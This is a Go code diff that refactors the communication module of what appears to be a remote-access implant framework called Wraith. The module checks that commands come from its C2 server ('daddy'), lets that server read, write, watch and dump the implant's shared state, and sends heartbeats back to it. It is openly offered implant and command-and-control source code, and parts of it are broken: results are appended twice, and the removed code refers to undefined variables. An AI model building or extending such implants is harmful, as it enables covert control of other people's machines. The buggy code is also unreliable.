@@ -4,7 +4,6 @@ import (
 	"bytes"
 	"context"
 	"crypto/ed25519"
-	"encoding/hex"
 	"fmt"
 	"io"
 	"math/rand"
@@ -42,6 +41,13 @@ type ModuleComosum struct {
 	// Keeps track of when we last spoke to daddy. If it's been too long, we'll
 	// send a heartbeat so he knows we're alive.
 	lastSpoke time.Time
+
+	// Keeps track of SHM fields the module is watching so we can receive updates
+	// and unwatch them.
+	watching map[struct {
+		string
+		int
+	}]chan any
 
 	// Configuration.
 
@@ -115,7 +121,8 @@ func (m *ModuleComosum) Mainloop(ctx context.Context, w *libwraith.Wraith) {
 		panic(fmt.Errorf("[%s] incorrect admin key size (is %d, should be %d)", MOD_NAME, keylen, ed25519.PublicKeySize))
 	}
 	// Who's your daddy?
-	daddy := memguard.NewEnclave(net.IP(address.AddrForKey(m.AdminPubKey)[:]).To16())
+	daddyIP := memguard.NewEnclave(net.IP(address.AddrForKey(m.AdminPubKey)[:]).To16())
+	daddyPubKey := memguard.NewEnclave(m.AdminPubKey)
 	memguard.ScrambleBytes(m.AdminPubKey)
 
 	var err error
@@ -162,7 +169,123 @@ func (m *ModuleComosum) Mainloop(ctx context.Context, w *libwraith.Wraith) {
 	tcpListener, _ := s.ListenTCP(&net.TCPAddr{Port: port})
 
 	mux := http.NewServeMux()
-	populateMux(mux, daddy)
+	mux.HandleFunc("/", func(res http.ResponseWriter, req *http.Request) {
+		daddyIPBytes, _ := daddyIP.Open()
+		daddyPubKeyBytes, _ := daddyPubKey.Open()
+		defer daddyIPBytes.Destroy()
+		defer daddyPubKeyBytes.Destroy()
+
+		// Verify that the connection is coming from C2.
+		if req.RemoteAddr != net.IP(daddyIPBytes.Bytes()).String() {
+			// You're not my daddy!
+			res.WriteHeader(http.StatusForbidden)
+			return
+		}
+
+		// Get the request body.
+		body, err := io.ReadAll(req.Body)
+		if err != nil {
+			res.WriteHeader(http.StatusBadRequest)
+			return
+		}
+
+		requestData := proto.PacketExchangeReq{}
+		err = proto.Unmarshal(&requestData, daddyPubKeyBytes.Bytes(), body)
+		if err != nil {
+			// The packet data is malformed, there is nothing more we
+			// can do.
+			res.WriteHeader(http.StatusBadRequest)
+			return
+		}
+
+		responseData := proto.PacketExchangeRes{}
+
+		// Set.
+		if len(requestData.Set) != 0 {
+			result := []string{}
+			for key, value := range requestData.Set {
+				w.SHMSet(key, value)
+				result = append(result, key)
+			}
+			responseData.Set = result
+		}
+
+		// Get.
+		if len(requestData.Get) != 0 {
+			result := map[string]any{}
+			for _, key := range requestData.Get {
+				result[key] = w.SHMGet(key)
+			}
+			responseData.Get = result
+		}
+
+		// Watch.
+		if len(requestData.Watch) != 0 {
+			result := map[string]int{}
+			for _, key := range requestData.Watch {
+				channel, watchId := w.SHMWatch(key)
+
+				// Keep track of this watch internally.
+				m.watching[struct {
+					string
+					int
+				}{
+					key,
+					watchId,
+				}] = channel
+
+				result[key] = watchId
+			}
+			responseData.Watch = result
+		}
+
+		// Unwatch.
+		if len(requestData.Unwatch) != 0 {
+			result := []struct {
+				CellName string
+				WatchId  int
+			}{}
+			for _, key := range requestData.Unwatch {
+				w.SHMUnwatch(key.CellName, key.WatchId)
+				result = append(result, key)
+
+				// Delete internal record of this watch.
+				delete(m.watching, struct {
+					string
+					int
+				}{
+					key.CellName,
+					key.WatchId,
+				})
+
+				result = append(result, key)
+			}
+			responseData.Unwatch = result
+		}
+
+		// Dump.
+		if requestData.Dump {
+			responseData.Dump = w.SHMDump()
+		}
+
+		// Prune.
+		if requestData.Prune {
+			responseData.Prune = w.SHMPrune()
+		}
+
+		// Respond!
+		responseDataBytes, err := proto.Marshal(&responseData, m.OwnPrivKey)
+		if err != nil {
+			w.SHMSet(libwraith.SHM_ERRS, fmt.Errorf("marshalling response failed: %e", err))
+			return
+		}
+
+		res.Write(responseDataBytes)
+		res.WriteHeader(http.StatusOK)
+
+		// Update last spoke time so we don't send unnecessary heartbeats.
+		m.lastSpoke = time.Now()
+	})
 
 	server := http.Server{
 		Addr:                         ":0",
@@ -210,7 +333,7 @@ func (m *ModuleComosum) Mainloop(ctx context.Context, w *libwraith.Wraith) {
 				return
 			case <-time.After(timeUntilHeartbeat):
 				func() {
-					daddyIP, _ := daddy.Open()
+					daddyIP, _ := daddyIP.Open()
 					defer daddyIP.Destroy()
 
 					// Build a heartbeat data packet.
@@ -271,94 +394,4 @@ func (m *ModuleComosum) Mainloop(ctx context.Context, w *libwraith.Wraith) {
 // Return the name of this module.
 func (m *ModuleComosum) WraithModuleName() string {
 	return MOD_NAME
-}
-
-func populateMux(mux *http.ServeMux, daddy *memguard.Enclave) {
-	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
-		daddyIP, _ := daddy.Open()
-		defer daddyIP.Destroy()
-
-		if r.RemoteAddr != net.IP(daddyIP.Bytes()).String() {
-			// You're not my daddy!
-			w.WriteHeader(http.StatusForbidden)
-			return
-		}
-
-		// Launch a goroutine to handle the request and issue a response.
-		go func() {
-			//
-			// Validate and process the packet.
-			//
-
-			peerPublicKey, err := hex.DecodeString(packet.Peer)
-			if err != nil {
-				// This shouldn't happen, but if the peer public key is
-				// malformed then we have no choice but to ignore the
-				// packet.
-				return
-			}
-
-			if !bytes.Equal(peerPublicKey, m.AdminPubKey) {
-				// This ensures that request packets are only accepted from
-				// the c2. As packets are signed, eventually we may be able
-				// to drop this check if we account for replay attacks. This
-				// would allow for store-and-forward capability where new
-				// Wraiths coming online will continue to execute commands
-				// or load modules even if c2 is down.
-				return
-			}
-
-			packetData := proto.PacketRR{}
-			err = proto.Unmarshal(&packetData, m.AdminPubKey, packet.Data)
-			if err != nil {
-				// The packet data is malformed, there is nothing more we
-				// can do.
-				return
-			}
-
-			func() {
-				defer func() {
-					if err := recover(); err != nil {
-						w.SHMSet(libwraith.SHM_ERRS, fmt.Errorf("command in request `%s` panicked: %e", packetData.TxId, err))
-					}
-				}()
-
-				response = communicator(m, w)
-			}()
-
-			//
-			// Respond to the packet.
-			//
-
-		respond:
-			responseData := proto.PacketRR{
-				Payload: response,
-				TxId:    packetData.TxId,
-			}
-
-			responseDataBytes, err := proto.Marshal(&responseData, m.OwnPrivKey)
-			if err != nil {
-				// There is no point sending anything because the TxId is included
-				// in the responseData and without it, c2 won't know what the response
-				// is to.
-				w.SHMSet(libwraith.SHM_ERRS, fmt.Errorf("marshalling response to `%s` failed: %e", packetData.TxId, err))
-				return
-			}
-
-			// Send the packet.
-			req := http.Request{
-				Method: http.MethodPost,
-				URL: &url.URL{
-					Scheme: "http",
-					Host:   hex.EncodeToString([]byte(packet.Peer)),
-					Path:   proto.ROUTE_PREFIX + proto.ROUTE_RR,
-				},
-				Cancel: ctx.Done(),
-				Body:   io.NopCloser(bytes.NewReader(responseDataBytes)),
-			}
-
-			// Send request to peer.
-			pSocket.HTTP().Client().Do(&req)
-		}()
-	})
 }
